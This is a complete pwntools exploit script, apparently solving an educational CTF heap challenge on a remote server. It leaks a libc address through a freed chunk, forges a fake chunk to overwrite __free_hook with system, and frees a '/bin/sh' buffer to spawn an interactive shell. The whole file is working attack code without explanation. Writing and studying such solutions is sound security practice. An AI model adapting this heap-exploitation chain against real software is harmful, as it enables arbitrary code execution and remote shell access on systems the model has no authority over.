#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r = process('./test', aslr=False)
r =remote('edu-ctf.zoolab.org', 10007)

def add(idx, name):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', str(idx))
    r.sendafter('> ', name)

def edit(idx, sz, data):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', str(idx))
    r.sendlineafter('> ', str(sz))
    r.send(data)

def delete(idx):
    r.sendlineafter('> ', '3')
    r.sendlineafter('> ', str(idx))

def show():
    r.sendlineafter('> ', '4')

#####################################
add(0, 'A'*8)
edit(0, 0x418, 'A')

add(1, 'B'*8)
edit(1, 0x18, 'B')

add(2, 'C'*8)

delete(0)
show()

r.recvuntil('data: ')
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecbe0
free_hook = libc + 0x1eee48
system = libc + 0x52290
info(f"libc: {hex(libc)}")

#####################################
fake_chunk = flat(
    0,           0x21,
    b'CCCCCCCC', b'CCCCCCCC',
    free_hook,
)

data = b'/bin/sh\x00'.ljust(0x10, b'B')
edit(1, 0x38, data + fake_chunk)
edit(2, 0x8, p64(system))

delete(1)

r.interactive()
